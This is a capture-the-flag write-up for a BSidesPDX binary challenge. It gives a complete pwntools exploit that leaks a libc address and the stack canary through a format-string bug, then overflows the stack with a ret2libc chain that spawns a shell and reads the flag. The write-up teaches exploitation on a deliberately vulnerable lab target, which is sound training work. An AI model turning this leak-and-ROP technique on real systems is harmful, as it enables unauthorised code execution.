# Pwn 300 Solution

## Solution

For pwn challenges, I usually like to start with running `file` and `checksec` on the binary to see which anti-exploit mitigations are enabled.

```
$ file pwnclub
pwnclub: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f1f68bc690af2b457d6c52832c8a8055986a2626, not stripped
```

So this is a 64-bit Linux binary, and it is dynamically linked.  I specifically always like to check whether the binary is dynamically linked or statically linked, because if statically linked, then we likely can easily use a tool like `ROPgadget` to automatically build a ROP-chain for us.  However, because it is dynamically linked, the number of ROP gadgets available in the binary are likely to be limited.

```
$ checksec pwnclub
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Wow, so all are enabled.  I will briefly explain what the relevent anti-exploit mitigations mean.

```
NX:       NX enabled
```

NX (No eXecute) means that by default, none of the program's memory is both writeable and executeable (RWX).  So for exploitation, this means we will not be able to write shellcode to the stack and execute it because the stack memory can only be read/written to, not executed.  So this generally means we will need to use ROP or a similar technique such as ret2libc.

```
Stack:    Canary found
```

A stack canary is basically a set of bytes pushed onto the stack upon entering a function.  Before the function returns, the stack canary is validated to make sure a stack overflow was not encountered, which overwrites the existing stack canary.  We can bypass stack canaries by using an information disclosure bug to leak the stack canary value, and then including the expected stack canary in the stack overflow payload.

```
PIE:      PIE enabled
```

PIE (Position Independent Executeable) means that the base program is loaded at a randomized memory location each time the application runs.  That means, we can't hardcode addresses such as gadgets, GOT, or PLT.  We can, however, bypass this with another information disclosure bug that leaks an address within the program data, then calculate an offset from that leaked address to find other necessary data.

So now let's take a look at the binary.  When we run it, we see the following menu:

```
-----------------------------------------
-------------- Pick a Vuln --------------
1) strfmt
2) stack overflow
3) exit
> 
```

So the vulnerabilities in this application are pretty straight-forward.  The tricky part is building an exploit that launches a shell.  Here is an example of using each exploit:

```
-----------------------------------------
-------------- Pick a Vuln --------------
1) strfmt
2) stack overflow
3) exit
> 1
Give me your strfmt payload: %p.%p.%p.%p.%p.

0xa.0x7fc8845328c0.0x7fc884255154.0xa.0x7fc884728500.
-----------------------------------------
-------------- Pick a Vuln --------------
1) strfmt
2) stack overflow
3) exit
> 2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
See you on the otherside!
-----------------------------------------
-------------- Pick a Vuln --------------
1) strfmt
2) stack overflow
3) exit
> 3
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

So now, let's take a look again at the anti-exploit mitigations, and how we can use these 2 vulnerabilities to build a working exploit.

```
Stack:    Canary found
```
We can use the strfmt vulnerability to leak the stack canary

```
NX:       NX enabled
PIE:      PIE enabled
```
To avoid using gadgets within the binary itself, we can use the strfmt vuln to leak a libc address, and build a ret2libc exploit.  The stack overflow vulnerability will be used to trigger the ret2libc exploit, but we will have to be sure to include the correct stack canary in our stack overflow payload.


### Exploit Strategy

1. Use strfmt to leak libc address
2. Use strfmt to leak stack canary
3. Use stack overflow to perform ret2libc

Let's now attach a debugger to this binary, and figure out how we are going to build the strfmt payloads to leak the required information.  I used the IDA Pro `linux_serverx64` for debugging, however, you could also use `gdb`.

### Leaking the libc address

In my debugger, I set a breakpoint at `main`.  The first thing I did was check the address of libc's `read` function from the GOT.PLT.  During my debug session, `read` was loaded at address: `0x7fddde3ac070`.  This will be randomized each time the program is executed, so don't expect this value to match your's.

Next, I used the strfmt vuln to leak a bunch of addresses, the payload I used was `%p.%p.%p.%p.%p......`.  Here I noticed that the second value leaked, `0x7fddde6898c0` is relatively close to libc `read` address.  Notice, that the 5 most significant bytes are the same (`0x00007fdddeXXXXXX`).  We can calculate the offset like so:

```
0x7fddde6898c0(leak) - 0x7fddde3ac070(read) == 0x2dd850
```

So at runtime, we can dynamically calculate the address that libc `read` is loaded at with the following simple equation:

```
leak - 0x2dd850 == read
```

And then the equation for calculating the base address that libc.so is loaded at is also straight forward:
```python
libc_base = read - libc.symbols["read"]
```

Here is what my Python code looks like for calculating the libc base address, notice that I use direct parameter access to leak only the libc address (`%2$p`):

```python
from pwn import *
context(arch='amd64')

# Load libc shared lib
if REMOTE:
    libc = ELF('./libc-2.27.so')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# Start the process or create connection to remote server
if REMOTE:
    p = remote(HOST, PORT)
elif DEBUG:
    p = process(['linux_serverx64', '-p4200', FNAME])
else:
    p = process([FNAME])

# Leak libc address
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('payload: ')

payload = '%2$p'
p.sendline(payload)
p.recvline()

ret = p.recvline().strip()
libc_leak = eval(ret)
log.info('libc leaked address: 0x%x' % libc_leak)

# Calculate address of libc read() function
libc_read_addr = libc_leak - 0x2dd850
log.info('libc read address: 0x%x' % libc_read_addr)

libc_base = libc_read_addr - libc.symbols["read"]
libc.address = libc_base
log.info('libc base address: 0x%x' % libc.address)
```

Once we have the libc base address, it is pretty simple to build the ret2libc ROP chain.

```python
# Build out our ROP chain now that we have libc address
rop = ROP(libc)
binsh_addr = next(libc.search('/bin/sh\x00'))
log.info('/bin/sh @ 0x%x' % binsh_addr)
# Why do I have to do this twice?
rop.system(binsh_addr)
rop.system(binsh_addr)
rop.exit(42)
log.info('ret2libc ROP: \n' + rop.dump())
```

Notice, I call `rop.system(binsh_addr)` twice.  I later added this to my exploit, because the shell was not getting executed without it.  I'm not sure why this is required, if anyone can answer this, please let me know.

### Leaking the stack canary

We have the ret2libc ROP chain ready to go now, but before we can use the stack overflow, we must also leak the stack canary value.

Much like leaking the libc address, I used a debugger to set a breakpoint at main, checked what the stack canary value is, and then used the strfmt vuln to leak a bunch of data from the stack.

Here I noticed that the 39th leaked value from the stack was the stack canary.

Here is the Python code for doing such, again, I use direct parameter access to only like the 39th argument from the stack (`%39$p`):

```python
# Leak the stack canary
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('payload: ')

payload = '%39$p'
p.sendline(payload)
p.recvline()

ret = p.recvline().strip()
stack_canary = eval(ret)

log.info('Stack Canary: 0x%x' % stack_canary)
```

### Stack Overflow Time!

Now, it is time to build our final exploit payload, and trigger the ret2libc exploit.  And much like before, I rely on my debugger to figure out that for the stack overflow, we must pass in 24 characters of padding, followed by the 64-bit stack canary, followed by another 8 characters of padding, and finally the ret2libc ROP chain.  After the overflow is performed, we must select `exit` so that main is returned from.

```python

# Perform Buffer Overflow
p.recvuntil('> ')
p.sendline('2')

payload = ''
payload += 'A'*24
payload += p64(stack_canary)
payload += 'C'*8
payload += str(rop)
p.sendline(payload)

# Trigger the exploit
p.recvuntil('> ')
p.sendline('3')

# Interactive Shell
p.interactive()
```

## Expected Output
```
$ ./solution.py 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './pwnclub': pid 2515
[*] libc leaked address: 0x7f244bc528c0
[*] libc read address: 0x7f244b975070
[*] libc base address: 0x7f244b865000
[*] Loading gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
[*] /bin/sh @ 0x7f244ba18e9a
[*] ret2libc ROP: 
    0x0000:   0x7f244b88655f pop rdi; ret
    0x0008:   0x7f244ba18e9a [arg0] rdi = 139793864429210
    0x0010:   0x7f244b8b4440 system
    0x0018:   0x7f244b88655f pop rdi; ret
    0x0020:   0x7f244ba18e9a [arg0] rdi = 139793864429210
    0x0028:   0x7f244b8b4440 system
    0x0030:   0x7f244b88655f pop rdi; ret
    0x0038:             0x2a [arg0] rdi = 42
    0x0040:   0x7f244b8a8120 exit
[*] Stack Canary: 0x4c4dd3944cdb4f00
[*] Switching to interactive mode
$ ls -la
total 4568
drwxrwxr-x 2 aaron aaron    4096 Oct  8 12:21 .
drwxrwxr-x 4 aaron aaron    4096 Oct  8 11:34 ..
-rw------- 1 aaron aaron 4632576 Oct  8 12:21 core
-rw-rw-r-- 1 aaron aaron     726 Oct  8 11:34 Dockerfile
-rw-rw-r-- 1 aaron aaron      39 Oct  1 23:40 flag.txt
-rw-rw-r-- 1 aaron aaron      62 Oct  2 17:05 Makefile
-rwxrwxr-x 1 aaron aaron   13072 Oct  8 12:21 pwnclub
-rw-rw-r-- 1 aaron aaron    2490 Oct  2 00:07 pwnclub.c
-rwxrwxr-x 1 aaron aaron    2277 Oct  8 12:21 solution.py
$ cat flag.txt
BSidesPDX{w3lc0m3___70_7h3_pWn__club!}
```
